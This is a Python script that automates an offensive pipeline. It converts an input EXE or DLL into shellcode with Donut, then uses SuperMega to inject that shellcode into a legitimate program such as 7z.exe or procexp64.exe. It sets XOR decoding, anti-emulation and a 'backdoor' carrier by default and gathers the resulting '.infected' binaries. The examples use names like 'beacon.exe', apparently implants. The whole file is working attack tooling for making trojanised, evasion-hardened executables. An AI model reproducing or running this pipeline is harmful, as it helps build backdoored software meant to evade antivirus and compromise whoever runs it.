#!/usr/bin/env python3
"""
pipeline.py — Donut → SuperMega shellcode pipeline

Usage:
  python pipeline.py <input.exe|input.dll> [options]

Environment variables required:
  DONUT_PATH      Path to the donut directory (contains donut.exe / donut)
  SUPERMEGA_PATH  Path to the supermega directory (contains supermega.py)
"""

import argparse
import glob
import os
import shutil
import subprocess
import sys
from datetime import datetime
from pathlib import Path

# ─── ANSI colours (disabled on Windows without ANSI support) ─────────────────

def _ansi_supported():
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # Enable VIRTUAL_TERMINAL_PROCESSING
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            return True
        except Exception:
            return False
    return True

_USE_COLOUR = _ansi_supported()

def _c(code, text):
    return f"\033[{code}m{text}\033[0m" if _USE_COLOUR else text

def ok(msg):    print(_c("32", f"[+] {msg}"))
def info(msg):  print(_c("36", f"[*] {msg}"))
def warn(msg):  print(_c("33", f"[!] {msg}"))
def err(msg):   print(_c("31", f"[-] {msg}"), file=sys.stderr)
def step(msg):  print(_c("1;34", f"\n==> {msg}"))

# ─── Helpers ──────────────────────────────────────────────────────────────────

def resolve_tool_dir(env_name: str, fallback_name: str) -> Path:
    """Return path from env var, or fall back to .\<fallback_name> next to this script."""
    script_dir = Path(__file__).parent
    val = os.environ.get(env_name)
    if val:
        p = Path(val)
        if not p.exists():
            err(f"${env_name} points to a non-existent path: {p}")
            sys.exit(1)
        return p
    # Fallback: look for the folder next to this script
    fallback = script_dir / fallback_name
    if fallback.exists():
        warn(f"${env_name} not set — using fallback: {fallback}")
        return fallback
    err(f"${env_name} is not set and fallback path does not exist: {fallback}")
    sys.exit(1)


def prompt(label: str, default: str) -> str:
    val = input(f"  {label} [{default}]: ").strip()
    return val if val else default


def list_dir_files(directory: Path, extensions=None):
    if not directory.exists():
        return []
    files = sorted(directory.iterdir())
    if extensions:
        files = [f for f in files if f.suffix.lower() in extensions]
    return [f for f in files if f.is_file()]


def pick_from_list(items: list, label: str, default: str = "") -> str:
    """Present a numbered menu and return the chosen filename (stem+suffix)."""
    if not items:
        err(f"No {label} found.")
        sys.exit(1)
    print(f"\n  Available {label}:")
    for i, item in enumerate(items, 1):
        marker = " *" if item.name == default else ""
        print(f"    {i:2}. {item.name}{marker}")
    default_hint = f", default={default}" if default else ""
    while True:
        raw = input(f"  Select {label} (number or filename{default_hint}): ").strip()
        if raw == "" and default:
            return default
        if raw.isdigit():
            idx = int(raw) - 1
            if 0 <= idx < len(items):
                return items[idx].name
            warn("Out of range, try again.")
        elif raw:
            matches = [f for f in items if f.name == raw or f.stem == raw]
            if matches:
                return matches[0].name
            warn("Not found in list, try again.")


# ─── Stage 1: Donut ───────────────────────────────────────────────────────────

def run_donut(args, donut_dir: Path, output_bin: Path, dry_run: bool) -> Path:
    step("Stage 1 — Donut: converting to shellcode")

    # Resolve binary name
    if sys.platform == "win32":
        donut_bin = donut_dir / "donut.exe"
    else:
        donut_bin = donut_dir / "donut"
    if not donut_bin.exists():
        err(f"Donut binary not found: {donut_bin}")
        sys.exit(1)

    input_file = Path(args.input).resolve()
    if not input_file.exists():
        err(f"Input file not found: {input_file}")
        sys.exit(1)

    cmd = [str(donut_bin), "-i", str(input_file), "-b", "1", "-o", str(output_bin)]

    if args.arch:
        cmd += ["-a", str(args.arch)]
    if args.entropy:
        cmd += ["-e", str(args.entropy)]
    if args.cls:
        cmd += ["-c", args.cls]
    if args.method:
        cmd += ["-m", args.method]
    if args.args:
        cmd += ["-p", args.args]

    info(f"Command: {' '.join(cmd)}")

    if dry_run:
        warn("DRY RUN — skipping execution")
        return output_bin

    result = subprocess.run(cmd, capture_output=False)
    if result.returncode != 0:
        err(f"Donut exited with code {result.returncode}")
        sys.exit(1)

    if not output_bin.exists():
        err(f"Expected output not found: {output_bin}")
        sys.exit(1)

    ok(f"Shellcode written to: {output_bin}  ({output_bin.stat().st_size} bytes)")
    return output_bin


# ─── Venv management ──────────────────────────────────────────────────────────

def ensure_venv(supermega_dir: Path, dry_run: bool) -> str:
    """
    Ensure a venv exists at supermega_dir/.venv with supermega's requirements
    installed. Returns the path to the venv's Python binary.
    """
    venv_dir = supermega_dir / ".venv"

    if sys.platform == "win32":
        venv_python = venv_dir / "Scripts" / "python.exe"
        venv_pip    = venv_dir / "Scripts" / "pip.exe"
    else:
        venv_python = venv_dir / "bin" / "python"
        venv_pip    = venv_dir / "bin" / "pip"

    # Create venv if it doesn't exist
    if not venv_python.exists():
        info(f"Creating venv at: {venv_dir}")
        if not dry_run:
            result = subprocess.run(
                [sys.executable, "-m", "venv", str(venv_dir)],
                capture_output=False,
            )
            if result.returncode != 0:
                err("Failed to create venv")
                sys.exit(1)
            ok("Venv created")
        else:
            warn("DRY RUN — skipping venv creation")
            return sys.executable
    else:
        info(f"Using existing venv: {venv_dir}")

    # Install requirements if requirements.txt exists
    req_file = supermega_dir / "requirements.txt"
    if req_file.exists() and not dry_run:
        info("Installing supermega requirements into venv...")
        result = subprocess.run(
            [str(venv_pip), "install", "-r", str(req_file), "-q"],
            capture_output=False,
        )
        if result.returncode != 0:
            err("pip install failed")
            sys.exit(1)
        ok("Requirements installed")

    return str(venv_python)


# ─── Stage 2: SuperMega ───────────────────────────────────────────────────────

def run_supermega(args, supermega_dir: Path, shellcode_bin: Path,
                  output_dir: Path, timestamp: str, dry_run: bool):
    step("Stage 2 — SuperMega: backdooring injectable")

    shellcodes_dir = supermega_dir / "data" / "binary" / "shellcodes"
    injectables_dir = supermega_dir / "data" / "binary" / "injectables"

    shellcodes_dir.mkdir(parents=True, exist_ok=True)

    # Copy shellcode into supermega's shellcodes directory
    dest_shellcode = shellcodes_dir / shellcode_bin.name
    if not dry_run:
        shutil.copy2(shellcode_bin, dest_shellcode)
        info(f"Copied shellcode → {dest_shellcode}")

    # Resolve injectable
    if args.no_interactive and not args.injectable:
        # Pick the first available injectable automatically
        injectables = list_dir_files(injectables_dir, {".exe", ".dll"})
        if not injectables:
            err("No injectables found in supermega's injectables directory.")
            sys.exit(1)
        injectable_name = injectables[0].name
        info(f"Auto-selected injectable: {injectable_name}")
    elif args.injectable:
        injectable_name = args.injectable
        info(f"Using injectable: {injectable_name}")
    else:
        injectables = list_dir_files(injectables_dir, {".exe", ".dll"})
        injectable_name = pick_from_list(injectables, "injectable", default="7z.exe")

    # Resolve supermega options (interactive or defaults)
    if args.no_interactive:
        carrier          = args.carrier          or "alloc_rw_rx"
        decoder          = args.decoder          or "xor_2"
        antiemulation    = args.antiemulation    or "sirallocalot"
        carrier_invoke   = args.carrier_invoke   or "backdoor"
        payload_location = args.payload_location or ".code"
    else:
        print()
        carrier          = prompt("Carrier",          args.carrier          or "alloc_rw_rx")
        decoder          = prompt("Decoder",          args.decoder          or "xor_2")
        antiemulation    = prompt("Anti-emulation",   args.antiemulation    or "sirallocalot")
        carrier_invoke   = prompt("Carrier invoke",   args.carrier_invoke   or "backdoor")
        payload_location = prompt("Payload location", args.payload_location or ".code")

    python_bin = ensure_venv(supermega_dir, dry_run)
    supermega_script = supermega_dir / "supermega.py"

    cmd = [
        python_bin, str(supermega_script),
        "--shellcode",        shellcode_bin.name,
        "--inject",           injectable_name,
        "--carrier",          carrier,
        "--decoder",          decoder,
        "--antiemulation",    antiemulation,
        "--carrier_invoke",   carrier_invoke,
        "--payload_location", payload_location,
    ]

    info(f"Command: {' '.join(cmd)}")

    if dry_run:
        warn("DRY RUN — skipping execution")
        return

    result = subprocess.run(cmd, cwd=str(supermega_dir))
    if result.returncode != 0:
        err(f"SuperMega exited with code {result.returncode}")
        # Still attempt to collect any output that was written

    # Collect output files from projects/commandline/
    project_dir = supermega_dir / "projects" / "commandline"
    infected_files = list(project_dir.glob("*.infected.*")) if project_dir.exists() else []
    if not infected_files:
        # Fallback: grab all non-.c/.asm/.obj files from project dir
        infected_files = [
            f for f in project_dir.iterdir()
            if f.is_file() and f.suffix.lower() in {".exe", ".dll"}
        ] if project_dir.exists() else []

    if not infected_files:
        warn("No infected output files found in projects/commandline/")
    else:
        for f in infected_files:
            stem = Path(injectable_name).stem
            suffix = f.suffix
            dest_name = f"{stem}_{timestamp}{suffix}"
            dest = output_dir / dest_name
            shutil.copy2(f, dest)
            ok(f"Output → {dest}")

    # Cleanup: remove shellcode copy from supermega's shellcodes dir
    try:
        dest_shellcode.unlink()
        info(f"Cleaned up: {dest_shellcode}")
    except Exception:
        pass


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Donut → SuperMega shellcode pipeline",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Environment variables:
  DONUT_PATH      Path to the donut directory
  SUPERMEGA_PATH  Path to the supermega directory

Examples:
  python pipeline.py beacon.exe
  python pipeline.py tool.exe --args "/silent /install"
  python pipeline.py assembly.dll --class Foo --method Run --no-interactive --injectable procexp64.exe
  python pipeline.py payload.exe --dry-run
        """,
    )

    parser.add_argument("input", help="Input EXE or DLL to convert with Donut")

    # Donut options
    dgrp = parser.add_argument_group("Donut options")
    dgrp.add_argument("--args",    metavar="PARAMS",  help="Command-line args to pass to the payload via Donut (-p)")
    dgrp.add_argument("--arch",    metavar="N",       type=int, choices=[1, 2, 3],
                      help="Target arch: 1=x86  2=amd64  3=x86+amd64 (donut default)")
    dgrp.add_argument("--entropy", metavar="N",       type=int, choices=[1, 2, 3],
                      help="Entropy: 1=None  2=Random names  3=Random+encrypt (donut default)")
    dgrp.add_argument("--class",   dest="cls",        metavar="NAME", help=".NET class name (-c)")
    dgrp.add_argument("--method",  metavar="NAME",    help=".NET/DLL method name (-m)")

    # SuperMega options
    sgrp = parser.add_argument_group("SuperMega options")
    sgrp.add_argument("--injectable",     metavar="FILE",
                      help="Injectable filename (from supermega's injectables dir)")
    sgrp.add_argument("--carrier",        metavar="NAME", help="Carrier (default: alloc_rw_rx)")
    sgrp.add_argument("--decoder",        metavar="NAME", help="Decoder (default: xor_2)")
    sgrp.add_argument("--antiemulation",  metavar="NAME", help="Anti-emulation (default: sirallocalot)")
    sgrp.add_argument("--carrier-invoke", dest="carrier_invoke", metavar="NAME",
                      help="Carrier invoke method (default: backdoor)")
    sgrp.add_argument("--payload-location", dest="payload_location", metavar="LOC",
                      choices=[".code", ".rdata"],
                      help="Payload location: .code=.text (default), .rdata=.rdata")

    # Behaviour flags
    parser.add_argument("--no-interactive", action="store_true",
                        help="Use defaults for all SuperMega prompts (non-interactive mode)")
    parser.add_argument("--dry-run",        action="store_true",
                        help="Print commands without executing them")

    args = parser.parse_args()

    # Resolve tool directories (env var or fallback to ./donut and ./supermega)
    donut_dir     = resolve_tool_dir("DONUT_PATH",     "donut")
    supermega_dir = resolve_tool_dir("SUPERMEGA_PATH", "supermega")

    supermega_script = supermega_dir / "supermega.py"
    if not supermega_script.exists():
        err(f"supermega.py not found at: {supermega_script}")
        sys.exit(1)

    # Prepare output dirs
    script_dir = Path(__file__).parent
    results_bin      = script_dir / "results" / "bin"
    results_obfuscate = script_dir / "results" / "obfuscate"
    results_bin.mkdir(parents=True, exist_ok=True)
    results_obfuscate.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    input_stem = Path(args.input).stem
    output_bin = results_bin / f"{input_stem}_{timestamp}.bin"

    info(f"Input:         {args.input}")
    info(f"Donut path:    {donut_dir}")
    info(f"SuperMega path:{supermega_dir}")
    info(f"Timestamp:     {timestamp}")
    if args.dry_run:
        warn("DRY RUN mode active — no commands will be executed")

    # Stage 1
    shellcode_bin = run_donut(args, donut_dir, output_bin, args.dry_run)

    # Stage 2
    run_supermega(args, supermega_dir, shellcode_bin, results_obfuscate,
                  timestamp, args.dry_run)

    step("Pipeline complete")
    ok(f"Shellcode:  {results_bin}/")
    ok(f"Output:     {results_obfuscate}/")


if __name__ == "__main__":
    main()
